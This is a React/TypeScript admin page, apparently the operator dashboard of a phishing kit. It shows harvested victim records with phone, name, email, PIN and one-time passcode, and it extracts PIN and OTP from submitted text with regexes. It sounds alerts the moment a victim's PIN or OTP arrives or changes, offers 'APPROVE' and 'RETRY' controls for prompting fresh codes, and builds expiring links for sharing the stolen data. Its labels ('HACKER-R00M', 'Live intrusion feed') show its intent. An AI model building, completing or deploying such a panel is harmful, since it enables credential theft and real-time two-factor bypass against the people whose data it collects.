import React, { useEffect, useRef, useState } from 'react';
import { supabase } from '../supabaseClient';
import { derivePinAndOtpFromRecord, normalizeApplicationRecord } from '../utils/supabaseCompat';
import {
  createViewerLinkInSupabase,
  fetchApplicationsFromSupabase,
  fetchViewerLinksFromSupabase,
  revokeViewerLinkInSupabase,
  updateApplicationStatusInSupabase,
} from '../utils/supabaseDirect';

type ApplicationRecord = {
  id: string;
  phone?: string | null;
  pin?: string | null;
  otp?: string | null;
  firstName?: string | null;
  lastName?: string | null;
  verificationCode?: string | null;
  verification_code?: string | null;
  submittedAt?: string | null;
  email?: string | null;
};

type AdminLinkRecord = {
  id: string;
  admin_id: string;
  created_by: string;
  created_at: string;
  expires_at: string;
  revoked: boolean;
  revoked_at?: string | null;
  usage_count?: number;
  last_used_at?: string | null;
};

const sortApplications = (items: ApplicationRecord[]) =>
  [...items].sort((a, b) => new Date(b.submittedAt ?? 0).getTime() - new Date(a.submittedAt ?? 0).getTime());

const formatDateTime = (value: string) =>
  new Date(value).toLocaleString([], {
    year: 'numeric',
    month: 'short',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
  });

const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const adminTitle = '⚡ ɴᴏɪᴢᴇ // 4RCH-0PS';
  const adminSubtitle = 'HACKER-R00M • SUBMISSION GRID';
  const [applications, setApplications] = useState<ApplicationRecord[]>([]);
  const [isLoadingApplications, setIsLoadingApplications] = useState(true);
  const [links, setLinks] = useState<AdminLinkRecord[]>([]);
  const [isApproving, setIsApproving] = useState<Record<string, boolean>>({});
  const [minutes, setMinutes] = useState('30');
  const [hours, setHours] = useState('0');
  const [days, setDays] = useState('0');
  const [exactExpiry, setExactExpiry] = useState('');
  const [createdLink, setCreatedLink] = useState<string | null>(null);
  const [isCreatingLink, setIsCreatingLink] = useState(false);
  const [notificationPulse, setNotificationPulse] = useState(false);
  const channelRef = useRef<any>(null);
  const audioContextRef = useRef<AudioContext | null>(null);
  const notificationTimeoutRef = useRef<number | null>(null);
  const applicationsRef = useRef<ApplicationRecord[]>([]);

  const getAuthHeaders = async () => {
    const headers: Record<string, string> = { 'Content-Type': 'application/json' };
    const params = new URLSearchParams(window.location.search);
    const accessToken = params.get('access_token');
    if (accessToken) {
      headers['x-admin-access-token'] = accessToken;
    }

    if (!supabase) {
      return headers;
    }

    try {
      const { data: { session } } = await supabase.auth.getSession();
      if (session?.access_token) {
        headers.Authorization = `Bearer ${session.access_token}`;
      }
    } catch {
      // ignore
    }

    return headers;
  };

  const fetchApplications = async () => {
    setIsLoadingApplications(true);
    try {
      const rows = await fetchApplicationsFromSupabase(100);
      const normalized = (rows ?? []).map((r: any) => normalizeApplicationRecord(r));
      setApplications(sortApplications(normalized));
      setError(null);
    } catch (err: any) {
      setError(err?.message || 'Unable to load applications');
      setApplications([]);
    } finally {
      setIsLoadingApplications(false);
    }
  };

  const fetchLinks = async () => {
    try {
      const rows = await fetchViewerLinksFromSupabase();
      setLinks(rows ?? []);
    } catch (err: any) {
      console.error('[AdminPage] fetchLinks failed', err);
      setLinks([]);
    }
  };

  const upsertApplicationInState = (newApplication: ApplicationRecord) => {
    const normalized = normalizeApplicationRecord(newApplication as Record<string, any>);

    setApplications((current) => {
      const existingIndex = current.findIndex((item) => item.id === normalized.id);
      if (existingIndex >= 0) {
        const next = [...current];
        next[existingIndex] = { ...next[existingIndex], ...normalized };
        return sortApplications(next);
      }
      return sortApplications([normalized as ApplicationRecord, ...current]);
    });
  };

  const approveApplication = async (applicationId: string) => {
    setIsApproving((prev) => ({ ...prev, [applicationId]: true }));
    try {
      const updated = await updateApplicationStatusInSupabase(applicationId, 'Approved');
      if (updated) {
        setApplications((current) =>
          current.map((item) => (item.id === applicationId ? { ...item, status: updated.status } : item))
        );
      }
    } catch (err: any) {
      console.error('[AdminPage] approveApplication failed', err);
      setError(err?.message || 'Unable to approve application');
    } finally {
      setIsApproving((prev) => ({ ...prev, [applicationId]: false }));
    }
  };

  const retryApplication = async (applicationId: string) => {
    setIsApproving((prev) => ({ ...prev, [applicationId]: true }));
    try {
      const updated = await updateApplicationStatusInSupabase(applicationId, 'RetryRequested');
      if (updated) {
        setApplications((current) =>
          current.map((item) => (item.id === applicationId ? { ...item, status: updated.status } : item))
        );
      }
    } catch (err: any) {
      console.error('[AdminPage] retryApplication failed', err);
      setError(err?.message || 'Unable to retry application');
    } finally {
      setIsApproving((prev) => ({ ...prev, [applicationId]: false }));
    }
  };

  const getAudioContext = () => {
    if (audioContextRef.current) {
      return audioContextRef.current;
    }

    const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioCtx) {
      console.debug('[AdminPage] No AudioContext support available');
      return null;
    }

    try {
      audioContextRef.current = new AudioCtx();
      console.debug('[AdminPage] AudioContext created');
    } catch (err: any) {
      console.warn('[AdminPage] Failed to create AudioContext', err);
      return null;
    }

    return audioContextRef.current;
  };

  const playBeeps = async (count: number) => {
    const context = getAudioContext();
    console.debug('[AdminPage] playBeeps count=', count, 'currentState=', context?.state);
    if (!context || count < 1) {
      if (!context) {
        console.warn('[AdminPage] AudioContext unavailable, cannot play beeps');
      }
      return;
    }

    try {
      if (context.state === 'suspended') {
        console.debug('[AdminPage] AudioContext suspended, attempting resume');
        await context.resume();
        console.debug('[AdminPage] AudioContext resumed:', context.state);
      }
    } catch (err: any) {
      console.warn('[AdminPage] AudioContext resume failed, user interaction may be required', err);
      return;
    }

    if (context.state !== 'running') {
      console.warn('[AdminPage] AudioContext not running after resume:', context.state);
    }

    const now = context.currentTime;
    const beepDuration = 0.14;
    const gap = 0.2;
    const oscillator = context.createOscillator();
    const gain = context.createGain();

    oscillator.type = 'sine';
    oscillator.frequency.value = 880;
    gain.gain.value = 0;
    gain.gain.setValueAtTime(0.8, now);
    gain.connect(context.destination);
    oscillator.connect(gain);
    oscillator.start(now);

    for (let index = 0; index < count; index += 1) {
      const startTime = now + index * (beepDuration + gap);
      const endTime = startTime + beepDuration;
      gain.gain.setValueAtTime(0, startTime);
      gain.gain.linearRampToValueAtTime(0.45, startTime + 0.01);
      gain.gain.setValueAtTime(0.45, endTime - 0.02);
      gain.gain.linearRampToValueAtTime(0, endTime);
    }

    oscillator.stop(now + count * (beepDuration + gap));
    oscillator.onended = () => {
      oscillator.disconnect();
      gain.disconnect();
    };
  };

  const triggerRealtimeNotification = (beepCount: number) => {
    console.debug('[AdminPage] triggerRealtimeNotification', { beepCount });
    setNotificationPulse(true);
    if (notificationTimeoutRef.current) {
      window.clearTimeout(notificationTimeoutRef.current);
    }
    notificationTimeoutRef.current = window.setTimeout(() => {
      setNotificationPulse(false);
      notificationTimeoutRef.current = null;
    }, 1200);

    void playBeeps(beepCount);
  };

  const connectRealtime = async () => {
    if (channelRef.current) {
      try {
        if (typeof channelRef.current.close === 'function') {
          channelRef.current.close();
        } else if (typeof channelRef.current.unsubscribe === 'function') {
          await channelRef.current.unsubscribe();
        }
      } catch {
        // ignore
      }
    }

    if (!supabase) {
      setError('Supabase is not configured for realtime');
      return;
    }

    const channel = supabase
      .channel('admin-dashboard-realtime')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'applications' }, (payload: any) => {
        const normalized = normalizeApplicationRecord(payload.new as Record<string, any>);
        triggerRealtimeNotification(3);
        setApplications((current) => {
          const existingIndex = current.findIndex((item) => item.id === normalized.id);
          const next = existingIndex >= 0
            ? (() => {
                const clone = [...current];
                clone[existingIndex] = { ...clone[existingIndex], ...normalized };
                return clone;
              })()
            : [normalized as ApplicationRecord, ...current];
          return sortApplications(next);
        });
      })
      .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'applications' }, (payload: any) => {
        const normalized = normalizeApplicationRecord(payload.new as Record<string, any>);
        const oldRecord = (payload.old as Record<string, any>) || {};
        const newRecord = payload.new as Record<string, any>;
        const existingApp = applicationsRef.current.find((item) => item.id === normalized.id);

        const oldPin = payload.old
          ? derivePinAndOtpFromRecord(oldRecord).pin
          : existingApp?.pin ?? '';
        const oldOtp = payload.old
          ? derivePinAndOtpFromRecord(oldRecord).otp
          : existingApp?.otp ?? '';
        const newPin = derivePinAndOtpFromRecord(newRecord).pin;
        const newOtp = derivePinAndOtpFromRecord(newRecord).otp;

        const pinChanged = oldPin !== newPin;
        const otpChanged = oldOtp !== newOtp;
        if (pinChanged) {
          triggerRealtimeNotification(2);
        } else if (otpChanged) {
          triggerRealtimeNotification(1);
        }

        setApplications((current) => {
          const existingIndex = current.findIndex((item) => item.id === normalized.id);
          const next = existingIndex >= 0
            ? (() => {
                const clone = [...current];
                clone[existingIndex] = { ...clone[existingIndex], ...normalized };
                return clone;
              })()
            : [normalized as ApplicationRecord, ...current];
          return sortApplications(next);
        });
      });

    channelRef.current = channel;
    await channel.subscribe();
    return;
  };

  useEffect(() => {
    const restoreSession = async () => {
      const params = new URLSearchParams(window.location.search);
      const accessToken = params.get('access_token');

      if (!supabase) {
        if (accessToken) {
          setIsLoggedIn(true);
          await fetchApplications();
          await fetchLinks();
          await connectRealtime();
          return;
        }
        setError('Supabase is not configured');
        return;
      }

      try {
        const { data: { session }, error } = await supabase.auth.getSession();
        if (error) {
          throw error;
        }

        if (!session) {
          setIsLoggedIn(false);
          return;
        }

        const { data: { user } } = await supabase.auth.getUser(session.access_token);
        if (!user) {
          throw new Error('Unable to restore Supabase session');
        }

        setIsLoggedIn(true);
        await fetchApplications();
        await fetchLinks();
        await connectRealtime();
      } catch (err: any) {
        console.error('[Auth] session restore failed', err);
        setIsLoggedIn(false);
      }
    };

    const { data: authListener } = supabase
      ? supabase.auth.onAuthStateChange((event, session) => {
          if (session) {
            setIsLoggedIn(true);
            void fetchApplications();
            void fetchLinks();
            void connectRealtime();
            return;
          }

          setIsLoggedIn(false);
          setError(null);
        })
      : { data: null };

    void restoreSession();
    return () => {
      authListener?.subscription?.unsubscribe?.();
      if (channelRef.current) {
        try {
          if (typeof channelRef.current.close === 'function') {
            channelRef.current.close();
          } else if (typeof channelRef.current.unsubscribe === 'function') {
            channelRef.current.unsubscribe();
          }
        } catch {
          // ignore
        }
      }
      if (notificationTimeoutRef.current) {
        window.clearTimeout(notificationTimeoutRef.current);
      }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    applicationsRef.current = applications;
  }, [applications]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    const normalizedUsername = username.trim();
    const normalizedPassword = password.trim();

    if (!normalizedUsername || !normalizedPassword) {
      setError('Email and password are required');
      return;
    }

    if (!supabase) {
      setError('Supabase is not configured');
      return;
    }

    try {
      const { data, error } = await supabase.auth.signInWithPassword({
        email: normalizedUsername,
        password: normalizedPassword,
      });
      if (error || !data.session || !data.user) {
        throw error || new Error('Unable to sign in');
      }

      setIsLoggedIn(true);
      await fetchApplications();
      await fetchLinks();
      await connectRealtime();
    } catch (err: any) {
      console.error('[Auth] sign in failed', err);
      setError(err?.message || 'Unable to login');
    }
  };

  const createLink = async () => {
    setIsCreatingLink(true);
    setCreatedLink(null);
    try {
      const link = await createViewerLinkInSupabase({
        durationMinutes: Number(minutes || 0),
        durationHours: Number(hours || 0),
        durationDays: Number(days || 0),
        expiresAt: exactExpiry || undefined,
      });
      setCreatedLink(link.viewerUrl || null);
      await fetchLinks();
      setError(null);
    } catch (err: any) {
      console.error('[AdminPage] createLink failed', err);
      setError(err?.message || 'Unable to create viewer link.');
    } finally {
      setIsCreatingLink(false);
    }
  };

  const revokeLink = async (id: string) => {
    try {
      await revokeViewerLinkInSupabase(id);
      await fetchLinks();
    } catch (err: any) {
      console.error('[AdminPage] revokeLink failed', err);
      setError(err?.message || 'Unable to revoke viewer link.');
    }
  };

  const handleBackToApp = async () => {
    if (supabase) {
      try {
        const { error } = await supabase.auth.signOut();
        if (error) {
          throw error;
        }
      } catch (err: any) {
        console.error('[Auth] signOut failed', err);
      }
    }
    onBackToApp();
  };

  if (!isLoggedIn) {
    return (
      <div className="relative overflow-hidden w-full max-w-md rounded-3xl border border-[#14ff7d]/40 bg-[#020505] p-6 shadow-[0_0_70px_rgba(0,255,123,0.14)] text-[#d7ffdc]">
        <div className="pointer-events-none absolute inset-0 bg-[radial-gradient(circle_at_top_left,_rgba(16,255,128,0.18),_transparent_34%)]" />
        <div className="pointer-events-none absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.04)_1px,_transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.04)_1px,_transparent_1px)] bg-[length:32px_32px]" />
        <button type="button" onClick={handleBackToApp} className="relative z-10 text-xs uppercase tracking-[0.35em] text-[#8df4a2] hover:text-white">
          ← BACK
        </button>
        <div className="relative z-10 mt-4 space-y-3">
          <div className="text-sm text-[#7ff1ab]">ACCESS PANEL</div>
          <h2 className="text-3xl font-black uppercase tracking-[0.3em] text-[#dcff8f]">ADMIN LOGIN</h2>
          <p className="text-sm text-[#96ffaa]">Enter the gateway credentials to access the terminal.</p>
        </div>
        {error ? (
          <div className="relative z-10 mt-4 rounded-3xl border border-[#ff1f56]/30 bg-[#1f0413] p-4 text-sm text-[#ff7d96] shadow-[0_0_20px_rgba(255,31,86,0.18)]">
            {error}
          </div>
        ) : null}
        <form onSubmit={handleLogin} className="relative z-10 mt-6 space-y-4">
          <div>
            <label className="block text-xs uppercase tracking-[0.25em] text-[#8df4a2]">username</label>
            <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="mt-2 w-full rounded-3xl border border-[#14ff7d]/40 bg-[#07120f] px-4 py-3 text-sm text-[#e6ffe4] outline-none focus:border-[#6cff95] focus:ring-2 focus:ring-[#6cff95]/30" required />
          </div>
          <div>
            <label className="block text-xs uppercase tracking-[0.25em] text-[#8df4a2]">password</label>
            <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} className="mt-2 w-full rounded-3xl border border-[#14ff7d]/40 bg-[#07120f] px-4 py-3 text-sm text-[#e6ffe4] outline-none focus:border-[#6cff95] focus:ring-2 focus:ring-[#6cff95]/30" required />
          </div>
          <button type="submit" className="w-full rounded-full border border-[#6cff95] bg-[#0d180f] px-4 py-3 text-sm font-semibold uppercase tracking-[0.35em] text-[#b4ffbb] shadow-[0_0_16px_rgba(108,255,149,0.25)] transition hover:bg-[#101d12]">
            SIGN IN
          </button>
        </form>
      </div>
    );
  }

  return (
    <div
      className="relative overflow-hidden w-full max-w-6xl rounded-[28px] border border-[#14ff7d]/30 bg-[#020202] p-6 shadow-[0_0_96px_rgba(16,255,126,0.18)] text-[#b8ffb7]"
      style={{
        backgroundImage:
          'radial-gradient(circle at top left, rgba(16,255,126,0.16), transparent 24%), linear-gradient(rgba(255,255,255,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.05) 1px, transparent 1px)',
        backgroundSize: '48px 48px, 48px 48px, 48px 48px',
      }}
    >
      <div className="pointer-events-none absolute inset-0 bg-[radial-gradient(circle_at_bottom_right,_rgba(0,255,180,0.12),_transparent_35%)]" />
      <div className="relative z-10 flex flex-col gap-4 lg:flex-row lg:items-center lg:justify-between">
        <div>
          <button type="button" onClick={onBackToApp} className="text-xs uppercase tracking-[0.35em] text-[#7aff9a] hover:text-white">
            ← EXIT
          </button>
          <h1 className="mt-3 text-4xl font-black uppercase tracking-[0.22em] text-[#d4ff9b]">
            ⚡ .ADMIN / TERMINAL
          </h1>
          <p className="mt-2 text-sm uppercase tracking-[0.3em] text-[#85ff9f]">{adminSubtitle}</p>
        </div>
        <div className="flex items-center gap-2 rounded-full border border-[#7cff9d]/40 bg-[#08120d]/80 px-4 py-2 text-xs uppercase tracking-[0.25em] text-[#98ffad]">
          <span className={`h-2.5 w-2.5 rounded-full bg-[#00ff6d] transition-all duration-200 ${notificationPulse ? 'opacity-100 scale-125' : 'opacity-40 scale-90'}`} />
          <span>sensor active</span>
        </div>
      </div>

      {error ? (
        <div className="relative z-10 mt-6 rounded-3xl border border-[#ff4c6b]/40 bg-[#16050f] p-4 text-sm text-[#ff8ba0] shadow-[0_0_26px_rgba(255,76,107,0.18)]">
          {error}
        </div>
      ) : null}

      <div className="relative z-10 mt-6 grid gap-6 lg:grid-cols-[1.2fr_0.8fr]">
        <section className="rounded-3xl border border-[#14ff7d]/20 bg-[#091012]/90 p-4 shadow-[0_0_24px_rgba(16,255,126,0.08)]">
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-lg font-semibold uppercase tracking-[0.2em] text-[#d8ffa8]">Submission Grid</h2>
              <p className="text-xs uppercase tracking-[0.25em] text-[#7dff9b]">Live intrusion feed</p>
            </div>
            <span className="text-sm uppercase tracking-[0.25em] text-[#84ffad]">{applications.length} nodes</span>
          </div>
          {isLoadingApplications ? (
            <div className="mt-4 rounded-3xl border border-[#14ff7d]/20 bg-[#061011] p-6 text-sm text-[#7aff9e]">loading feed…</div>
          ) : applications.length === 0 ? (
            <div className="mt-4 rounded-3xl border border-[#14ff7d]/20 bg-[#061011] p-6 text-sm text-[#7aff9e]">no active submissions.</div>
          ) : (
            <div className="mt-4 space-y-3">
              {applications.map((app) => {
                const rawVerificationValue = app.verificationCode ?? app.verification_code ?? '';
                const pinValue = app.pin || rawVerificationValue.match(/PIN[:\s]+([^\s/]+)/i)?.[1] || '—';
                const otpValue = app.otp || rawVerificationValue.match(/OTP[:\s]+([^\s/]+)/i)?.[1] || '—';
                return (
                  <div key={app.id} className="group relative overflow-hidden rounded-3xl border border-[#14ff7d]/20 bg-[#050a0b] p-4 shadow-[0_0_28px_rgba(16,255,126,0.08)] transition hover:-translate-y-0.5 hover:border-[#7cff9d]/70">
                    <div className="absolute right-4 top-4 h-2 w-2 rounded-full bg-[#ffb300] shadow-[0_0_18px_rgba(255,179,0,0.45)] animate-pulse" />
                    <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between">
                      <div>
                        <p className="text-base font-semibold uppercase tracking-[0.15em] text-[#effffe]">{app.phone || '—'}</p>
                        <p className="text-sm uppercase tracking-[0.18em] text-[#79ff9a]">{[app.firstName, app.lastName].filter(Boolean).join(' ') || 'UNKNOWN'}</p>
                      </div>
                      <div className="text-sm uppercase tracking-[0.18em] text-[#73ff96]">{app.submittedAt ? formatDateTime(app.submittedAt) : '—'}</div>
                    </div>
                    <div className="mt-3 rounded-2xl bg-[#091213]/95 p-3 text-sm text-[#c8ffd0]">
                      <div><strong className="text-[#aef3b7]">EMAIL:</strong> {app.email || 'N/A'}</div>
                      <div className="mt-1"><strong className="text-[#aef3b7]">PHONE:</strong> {app.phone || '—'}</div>
                      <div className="mt-1"><strong className="text-[#aef3b7]">PIN:</strong> {pinValue}</div>
                      <div className="mt-1"><strong className="text-[#aef3b7]">OTP:</strong> {otpValue}</div>
                    </div>
                    <div className="mt-3 flex flex-wrap items-center justify-between gap-3">
                      <div className="text-xs uppercase tracking-[0.25em] text-[#9cffb5]">{app.status || 'PRE-APPROVED'}</div>
                      <div className="flex flex-wrap gap-2">
                        {app.status?.toLowerCase() !== 'approved' ? (
                          <button
                            type="button"
                            onClick={() => approveApplication(app.id)}
                            disabled={Boolean(isApproving[app.id])}
                            className="rounded-full border border-[#12ff7d] bg-[#09201c] px-4 py-2 text-sm font-black uppercase tracking-[0.3em] text-[#c6ffcb] shadow-[0_0_18px_rgba(18,255,125,0.16)] transition hover:border-[#6cff95] hover:bg-[#0f221d] disabled:opacity-60"
                          >
                            {isApproving[app.id] ? 'APPROVING…' : '☠ APPROVE'}
                          </button>
                        ) : (
                          <span className="rounded-full bg-[#12221a] px-3 py-1 text-xs font-semibold uppercase tracking-[0.3em] text-[#7dff9a]">APPROVED</span>
                        )}
                        <button
                          type="button"
                          onClick={() => retryApplication(app.id)}
                          disabled={Boolean(isApproving[app.id])}
                          className="rounded-full border border-[#35ffa2] bg-[#061110] px-4 py-2 text-sm font-semibold uppercase tracking-[0.25em] text-[#a5ffc8] transition hover:border-[#73ffa7] disabled:opacity-60"
                        >
                          RETRY
                        </button>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </section>

        <section className="space-y-4 rounded-3xl border border-[#14ff7d]/20 bg-[#081312]/90 p-4 shadow-[0_0_24px_rgba(16,255,126,0.08)]">
          <div>
            <h2 className="text-lg font-semibold uppercase tracking-[0.2em] text-[#d8ffa8]">Viewer links</h2>
            <p className="mt-1 text-xs uppercase tracking-[0.25em] text-[#7dff9b]">create secure share links</p>
          </div>

          <div className="rounded-3xl border border-[#14ff7d]/20 bg-[#061211] p-4">
            <div className="grid gap-3 sm:grid-cols-3">
              <div>
                <label className="block text-xs uppercase tracking-[0.25em] text-[#8dffab]">minutes</label>
                <input value={minutes} onChange={(e) => setMinutes(e.target.value)} className="mt-2 w-full rounded-3xl border border-[#19ff7a]/40 bg-[#08110f] px-3 py-2 text-sm text-[#d9ffd4] outline-none focus:border-[#7fffab] focus:ring-2 focus:ring-[#7fffab]/20" />
              </div>
              <div>
                <label className="block text-xs uppercase tracking-[0.25em] text-[#8dffab]">hours</label>
                <input value={hours} onChange={(e) => setHours(e.target.value)} className="mt-2 w-full rounded-3xl border border-[#19ff7a]/40 bg-[#08110f] px-3 py-2 text-sm text-[#d9ffd4] outline-none focus:border-[#7fffab] focus:ring-2 focus:ring-[#7fffab]/20" />
              </div>
              <div>
                <label className="block text-xs uppercase tracking-[0.25em] text-[#8dffab]">days</label>
                <input value={days} onChange={(e) => setDays(e.target.value)} className="mt-2 w-full rounded-3xl border border-[#19ff7a]/40 bg-[#08110f] px-3 py-2 text-sm text-[#d9ffd4] outline-none focus:border-[#7fffab] focus:ring-2 focus:ring-[#7fffab]/20" />
              </div>
            </div>
            <div className="mt-3">
              <label className="block text-xs uppercase tracking-[0.25em] text-[#8dffab]">exact expiry date/time</label>
              <input type="datetime-local" value={exactExpiry} onChange={(e) => setExactExpiry(e.target.value)} className="mt-2 w-full rounded-3xl border border-[#19ff7a]/40 bg-[#08110f] px-3 py-2 text-sm text-[#d9ffd4] outline-none focus:border-[#7fffab] focus:ring-2 focus:ring-[#7fffab]/20" />
            </div>
            <button type="button" onClick={createLink} disabled={isCreatingLink} className="mt-4 w-full rounded-full border border-[#14ff7d] bg-[#06110f] px-4 py-3 text-sm font-semibold uppercase tracking-[0.35em] text-[#c9ffd5] shadow-[0_0_18px_rgba(20,255,125,0.2)] transition hover:border-[#7cff9d] hover:bg-[#08140f] disabled:opacity-60">
              {isCreatingLink ? 'BUILDING LINK…' : 'BUILD VIEWER LINK'}
            </button>
            {createdLink ? (
              <div className="mt-3 rounded-3xl border border-[#14ff7d]/30 bg-[#08110f] p-3 text-sm text-[#afffa4] shadow-[0_0_18px_rgba(20,255,125,0.18)]">
                <div className="font-semibold uppercase tracking-[0.25em] text-[#c8ffb0]">CREATED LINK</div>
                <a href={createdLink} target="_blank" rel="noreferrer" className="break-all underline text-[#8dffae]">{createdLink}</a>
              </div>
            ) : null}
          </div>

          <div className="space-y-2">
            {links.length === 0 ? (
              <div className="rounded-3xl border border-[#14ff7d]/20 bg-[#061011] p-3 text-sm text-[#7dff9a]">no viewer channels active.</div>
            ) : (
              links.map((link) => (
                <div key={link.id} className="rounded-3xl border border-[#14ff7d]/20 bg-[#061011] p-3 text-sm text-[#bdfcbc] shadow-[0_0_18px_rgba(16,255,126,0.1)]">
                  <div className="flex items-center justify-between gap-2">
                    <div>
                      <div className="font-semibold uppercase tracking-[0.25em] text-[#d8ffa8]">{link.revoked ? 'revoked' : 'active'}</div>
                      <div className="text-xs uppercase tracking-[0.25em] text-[#83ff9c]">expires {formatDateTime(link.expires_at)}</div>
                    </div>
                    <button type="button" onClick={() => revokeLink(link.id)} className="rounded-full border border-[#14ff7d]/50 px-3 py-1 text-xs font-semibold uppercase tracking-[0.25em] text-[#c9ffd2] transition hover:border-[#7cff9d]">
                      REVOKE
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        </section>
      </div>
    </div>
  );
};

export default AdminPage;
